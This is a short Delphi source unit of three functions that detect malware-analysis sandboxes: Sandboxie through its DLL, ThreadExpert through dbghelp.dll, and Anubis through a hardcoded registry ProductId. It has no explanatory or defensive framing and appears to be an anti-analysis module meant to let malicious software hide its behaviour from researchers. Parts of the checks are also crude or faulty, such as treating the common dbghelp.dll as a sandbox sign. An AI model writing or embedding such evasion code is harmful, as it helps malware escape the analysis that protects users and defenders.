unit Unit2;

interface

uses
  windows,
  TLhelp32;

function Sandboxie: boolean;
function ThreadExpert: boolean;
function Anubis: boolean;

implementation

function Sandboxie: boolean;
var
  hMod:THandle;
begin
  Result := False;
  hMod:= GetModuleHandle(pchar('SbieDll.dll'));
  if hMod <> 0 then Result := True;
end;

function ThreadExpert: boolean;
var
  hMod:THandle;
begin
  Result := False;
  hMod:= GetModuleHandle(pchar('dbghelp.dll'));
  if hMod <> 0 then Result := True;
end;


function Anubis: boolean;
var
  hOpen:    hkey;
  sBuff:    array[0..256] of char;
  BuffSize: integer;
begin
  Result := false;
  if RegOpenKeyEx(HKEY_LOCAL_MACHINE, PChar('Software\Microsoft\Windows\CurrentVersion'), 0, KEY_QUERY_VALUE, hOpen) = ERROR_SUCCESS then
  begin
    BuffSize := SizeOf(sBuff);
    RegQueryValueEx(hOpen, PChar('ProductId'), nil, nil, @sBuff, @BuffSize);
    if sBuff = pchar('76487-337-8429955-22614') then Result := True
  end;
  RegCloseKey(hOpen);
end;

end.


